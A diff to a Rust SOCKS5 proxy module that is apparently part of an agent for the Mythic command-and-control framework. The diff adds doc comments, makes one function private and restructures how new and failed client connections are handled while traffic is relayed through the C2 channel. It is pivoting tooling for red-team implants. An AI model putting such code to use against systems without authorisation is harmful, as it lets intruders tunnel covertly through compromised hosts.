@@ -38,6 +38,7 @@ enum CmdAction {
     Stop
 }
 
+/// Create a backgroud task for socks
 pub fn task_socks(
     parameters: &str,
     uuid: String,
@@ -92,7 +93,7 @@ pub fn task_socks(
 }
 
 /// Runs a async socks server
-pub fn setup_socks(
+fn setup_socks(
     snd_to_mythic: Sender<SocksMsg>,
     mut recv_from_mythic: Receiver<SocksMsg>,
 ) -> Result<(), Box<dyn Error>> {
@@ -113,8 +114,8 @@ pub fn setup_socks(
             let data = base64::decode(msg.data)?;
             let id = msg.server_id;
 
-            let op = if let Some(c) = client_sockets.lock().await.get_mut(&id){
-                match c {
+            let (new, op) = if let Some(c) = client_sockets.lock().await.get_mut(&id){
+                (false, match c {
                     Client::Connecting(jh) => {
                         jh.abort();
                         Err(io::Error::new(ErrorKind::NotConnected,""))
@@ -122,20 +123,23 @@ pub fn setup_socks(
                     Client::Connected(csock) => {
                         write_to_client(csock, &data).await
                     },
-                }
+                })
             }else{
+                //new client
+                (true, Ok(()))
+            };
+            if let Err(_e) = op {
+                //client error
+                client_sockets.lock().await.remove(&id);
+                write_mplx_data(id, true, &[0], &snd_to_mythic).await?;
+            }
+            if new {
                 //new client
                 let jh = tokio::spawn(connect_request(id,
                     snd_to_mythic.clone(),
                     data,
                     client_sockets.clone()));
                 client_sockets.lock().await.insert(id, Client::Connecting(jh));
-                Ok(())
-            };
-            if let Err(_e) = op {
-                //client error
-                client_sockets.lock().await.remove(&id);
-                write_mplx_data(id, true, &[0], &snd_to_mythic).await?;
             }
             if msg.exit {
                 if let Some(c) = client_sockets.lock().await.remove(&id){
@@ -154,12 +158,13 @@ pub fn setup_socks(
     })
 }
 
-
+/// send a bob of data to a local endpoint
 async fn write_to_client<W: AsyncWrite+Unpin>(csock: &mut W, data: &[u8]) -> io::Result<()> {
     csock.write_all(data).await?;
     csock.flush().await?;
     Ok(())
 }
+/// send a blob of data back to mythic
 async fn write_mplx_data(server_id: usize, exit: bool, data: &[u8], backend_w: &Sender<SocksMsg>) -> io::Result<()> {
 
     let args = SocksMsg {
@@ -174,11 +179,14 @@ enum Client {
     Connecting(JoinHandle<()>),
     Connected(WriteHalf<TcpStream>)
 }
+/// parse and handle new socks connection
 async fn connect_request(id: usize,
     backend_w: Sender<SocksMsg>,
     mut data: Vec<u8>,
     client_sockets: Arc<Mutex<HashMap<usize, Client>>>
 ) {
+    //socks auth is done by mythic (no auth)
+    //now process the connect request
     match socks_connect(&data).await {
         Ok(client_stream) => {
             data[1]=0;
@@ -195,6 +203,7 @@ async fn connect_request(id: usize,
         }
     }
 }
+/// parse DNS name + port
 async fn socks_dns(data: &[u8]) -> io::Result<SocketAddr> {
     let len = data[0] as usize;
     if data.len() != len+3 {return Err(io::Error::new(
@@ -211,6 +220,7 @@ async fn socks_dns(data: &[u8]) -> io::Result<SocketAddr> {
         u16::from_be_bytes(portb)
     ).to_socket_addrs()?.next().ok_or(io::Error::new(ErrorKind::NotFound,""))
 }
+/// parse IPv6+Port
 async fn socks_ipv6(data: &[u8]) -> io::Result<SocketAddr> {
     if data.len() < 18 {return Err(io::Error::new(
         ErrorKind::UnexpectedEof,
@@ -225,6 +235,7 @@ async fn socks_ipv6(data: &[u8]) -> io::Result<SocketAddr> {
             u16::from_be_bytes(portb)
         ))
 }
+/// parse IPv4+Port
 async fn socks_ipv4(data: &[u8]) -> io::Result<SocketAddr> {
     if data.len() < 6 {return Err(io::Error::new(
     ErrorKind::UnexpectedEof,
@@ -239,6 +250,7 @@ async fn socks_ipv4(data: &[u8]) -> io::Result<SocketAddr> {
         u16::from_be_bytes(portb)
     ))
 }
+/// process the socks connect request
 async fn socks_connect(data: &[u8]) -> Result<TcpStream, u8> {
     if data.len() < 4 {return Err(1);}
     if data[0]!=5 {return Err(1);}
@@ -275,6 +287,7 @@ async fn socks_connect(data: &[u8]) -> Result<TcpStream, u8> {
         _ => Err(7)
     }
 }
+/// read data from the local connection and send it to mythic
 async fn read_from_client(id:usize, mut client_r : ReadHalf<TcpStream>, backend_w: &Sender<SocksMsg>) {
     let mut buffer : [u8; 8192] = [0; 8192];
     loop {
@@ -290,6 +303,4 @@ async fn read_from_client(id:usize, mut client_r : ReadHalf<TcpStream>, backend_
     }
     let _ = write_mplx_data(id, true, &[0], backend_w).await;
     //backend gone, but we are closing anyway
-    
-    //client_r.close();
 }
